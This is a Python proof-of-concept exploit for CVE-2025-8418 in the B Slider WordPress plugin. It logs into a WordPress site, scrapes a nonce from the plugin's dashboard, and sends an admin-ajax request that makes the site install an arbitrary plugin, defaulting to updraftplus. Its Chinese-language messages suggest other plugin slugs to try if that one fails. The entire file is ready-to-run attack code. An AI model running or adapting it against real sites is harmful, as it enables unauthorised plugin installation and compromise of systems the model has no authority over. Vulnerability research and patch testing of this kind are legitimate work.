import requests
from bs4 import BeautifulSoup
import re
import getpass
from colorama import init, Fore, Style

init(autoreset=True)

print(Fore.CYAN + "**********************************************")
print(Fore.CYAN + "*           Modified CVE-2025-8418 POC       *")
print(Fore.CYAN + "**********************************************")

site_url = input(Fore.YELLOW + 'Enter WordPress site URL (e.g., https://your-site.com): ').rstrip('/')
username = input(Fore.YELLOW + 'Enter username (must be admin): ')
password = getpass.getpass(Fore.YELLOW + 'Enter password: ')

session = requests.Session()
session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'})

# 登录逻辑
login_url = f'{site_url}/wp-login.php'
login_data = {
    'log': username,
    'pwd': password,
    'wp-submit': 'Log In',
    'redirect_to': f'{site_url}/wp-admin/'
}

login_response = session.post(login_url, data=login_data)

if 'wp-admin' not in login_response.url:
    print(Fore.RED + 'Login failed! Check site URL, username, or password.')
    print(Fore.RED + f'Login response URL: {login_response.url}')
    print(Fore.RED + f'Response status: {login_response.status_code}')
    exit()

print(Fore.GREEN + 'Login successful!')

# 访问B Slider专属仪表板
dashboard_url = f'{site_url}/wp-admin/admin.php?page=b-slider-dashboard'
dashboard_response = session.get(dashboard_url)

with open('dashboard.html', 'w', encoding='utf-8') as f:
    f.write(dashboard_response.text)
print(Fore.GREEN + 'Dashboard page saved as dashboard.html for debugging.')

soup = BeautifulSoup(dashboard_response.text, 'html.parser')
nonce = None

# 提取pluginAction中的nonce
print(Fore.YELLOW + '\nSearching for pluginAction nonce (critical for exploit)...')
nonce_pattern = r'var pluginAction\s*=\s*{\s*"ajaxUrl"\s*:\s*"[^"]+",\s*"nonce"\s*:\s*"([a-f0-9]+)"'

for script in soup.find_all('script'):
    if not script.string:
        continue
    
    if 'pluginAction' in script.string:
        print(Fore.CYAN + '\nFound target script (contains pluginAction):')
        script_snippet = script.string[:500] + ('...' if len(script.string) > 500 else '')
        print(Fore.CYAN + script_snippet)
        
        match = re.search(nonce_pattern, script.string)
        if match:
            nonce = match.group(1)
            print(Fore.GREEN + f'Extracted valid nonce: {nonce}')
            break

if not nonce:
    print(Fore.RED + '\nFailed to extract pluginAction nonce!')
    print(Fore.RED + 'Possible reasons:')
    print(Fore.RED + '- User is not an admin (requires manage_options permission)')
    print(Fore.RED + '- B Slider plugin is not activated')
    print(Fore.RED + '- Dashboard page failed to load (check dashboard.html)')
    manual_nonce = input(Fore.YELLOW + 'Enter nonce manually (from pluginAction in dashboard.html): ')
    if not manual_nonce:
        print(Fore.RED + 'Exiting due to missing nonce.')
        exit()
    nonce = manual_nonce
    print(Fore.GREEN + f'Using manually provided nonce: {nonce}')

# 关键修改：使用未安装的插件（例如"updraftplus"，可替换为其他未安装插件）
plugin_name = "updraftplus"  # 这个插件通常默认未安装，适合测试
ajax_url = f'{site_url}/wp-admin/admin-ajax.php'
params = {
    'action': 'activated_plugin',
    'nonce': nonce,
    'plugin_name': plugin_name
}

print(Fore.YELLOW + f'\nSending exploit request for plugin: {plugin_name}')
exploit_response = session.get(ajax_url, params=params)

# 输出结果
print(Fore.YELLOW + '\nExploit response details:')
print(Fore.CYAN + f'Status code: {exploit_response.status_code}')
print(Fore.CYAN + f'Response content: {exploit_response.text}')

if exploit_response.status_code == 200 and 'success":true' in exploit_response.text:
    print(Fore.GREEN + '\nExploit successful! Plugin installed.')
    print(Fore.GREEN + f'Check WordPress plugins page to activate {plugin_name}')
elif '目标目录已存在' in exploit_response.text:
    print(Fore.RED + '\nExploit failed: 目标插件目录已存在，请更换其他未安装的插件')
    print(Fore.RED + '建议尝试的插件slug: wordfence, wp-rocket, yoast-seo, contact-form-7')
else:
    print(Fore.RED + '\nExploit failed.')
